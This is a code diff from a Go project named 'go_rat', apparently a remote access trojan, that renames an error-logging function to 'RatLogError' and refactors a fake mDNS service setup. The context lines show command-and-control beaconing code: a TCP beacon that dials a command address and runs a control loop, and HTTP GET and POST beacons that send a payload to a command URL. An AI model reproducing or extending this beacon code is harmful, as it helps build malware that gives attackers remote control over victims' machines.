@@ -14,7 +14,6 @@ import (
 	"go_rat/pkg/shared_code/ErrorHandling"
 	"net"
 	"net/http"
-	"os"
 
 	"github.com/hashicorp/mdns"
 )
@@ -37,7 +36,7 @@ func BaconTCP(command_tcpaddr net.TCPAddr) (herp *net.TCPConn, derp error) {
 	connection, derp := net.DialTCP("tcp", &Core.Local_tcpaddr_LAN, &command_tcpaddr) // &Core.PHONEHOME_TCP)
 	if derp != nil {
 		// print the error
-		ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon handshake Failed")
+		ErrorHandling.RatLogError(derp, "[-] Error: TCP Beacon handshake Failed")
 		return
 	}
 	// if there was no error, continue to the control loop
@@ -56,13 +55,13 @@ func BaconTCP(command_tcpaddr net.TCPAddr) (herp *net.TCPConn, derp error) {
 		// if there is an error
 		if derp != nil {
 			// print the error
-			ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
+			ErrorHandling.RatLogError(derp, "[-] Error: TCP Beacon Connection Failed")
 			return connection, derp // error code : potato
 		}
 		json_from_command, derp := json.Marshal(netData)
 		if derp != nil {
 			// print the error
-			ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
+			ErrorHandling.RatLogError(derp, "[-] Error: TCP Beacon Connection Failed")
 			return connection, derp
 		}
 		beacon_reply := Core.BeaconResponse{
@@ -104,21 +103,21 @@ func BeaconHTTP(command_http string, method string) (herp *http.Response, derp e
 		//case "get":
 		http_response, derp := BeaconHTTPGet(command_http)
 		if derp != nil {
-			ErrorHandling.Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+			ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
 			return http_response, derp
 		}
 	} else if method == "post" {
 		//case "post":
 		http_response, derp := BeaconHTTPPost(command_http)
 		if derp != nil {
-			ErrorHandling.Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+			ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
 			return http_response, derp
 		}
 	} else {
 		//default:
 		http_response, derp := BeaconHTTPPost(command_http)
 		if derp != nil {
-			ErrorHandling.Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+			ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
 			return http_response, derp
 		}
 	}
@@ -129,7 +128,7 @@ func BeaconHTTP(command_http string, method string) (herp *http.Response, derp e
 func BeaconHTTPGet(command_url string) (*http.Response, error) {
 	http_response, derp := http.Get(command_url)
 	if derp != nil {
-		ErrorHandling.Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+		ErrorHandling.RatLogError(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
 		return http_response, derp
 	}
 	return http_response, derp
@@ -138,7 +137,7 @@ func BeaconHTTPGet(command_url string) (*http.Response, error) {
 func BeaconHTTPPost(command_url string) (*http.Response, error) {
 	post_body, derp := json.Marshal(Core.BEACONPOSTPAYLOAD)
 	if derp != nil {
-		ErrorHandling.Error_printer(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
+		ErrorHandling.RatLogError(derp, "[-] Beacon POST payload failed to marshal, stopping beacon")
 	}
 	// but this function we are using takes bytes!
 	// so you need a line of code like THIS!!
@@ -147,7 +146,7 @@ func BeaconHTTPPost(command_url string) (*http.Response, error) {
 	post_body_bytes := bytes.NewBuffer(post_body)
 	http_response, derp := http.Post(command_url, "text/html", post_body_bytes)
 	if derp != nil {
-		ErrorHandling.Error_printer(derp, "[-] Beacon POST failed to connect to command, stopping beacon")
+		ErrorHandling.RatLogError(derp, "[-] Beacon POST failed to connect to command, stopping beacon")
 		return http_response, derp
 	}
 	return http_response, derp
@@ -189,18 +188,10 @@ func MdnsResponder() {
 	close(entriesCh)
 }
 
-func StartMdnsReceiver(service_name string, false_service_struct Core.FakeMDNSService) {
-	// Setup our service export
-	host, _ := os.Hostname()
-	info := []string{service_name}
-	service, _ := mdns.NewMDNSService(host, "_foobar._tcp", "", "", 8000, nil, info)
-	// assign to struct
-	fake_mdns_service := Core.FakeMDNSService{}
-	fake_mdns_service.Host = host
-	fake_mdns_service.Info = info[0]
-	fake_mdns_service.Service = *service
-
+func StartMdnsReceiver(service_name string,
+	ServiceObj *mdns.MDNSService,
+	false_service_struct Core.FakeMDNSService) {
 	// Create the mDNS server, defer shutdown
-	server, _ := mdns.NewServer(&mdns.Config{Zone: service})
+	server, _ := mdns.NewServer(&mdns.Config{Zone: ServiceObj})
 	defer server.Shutdown()
 }
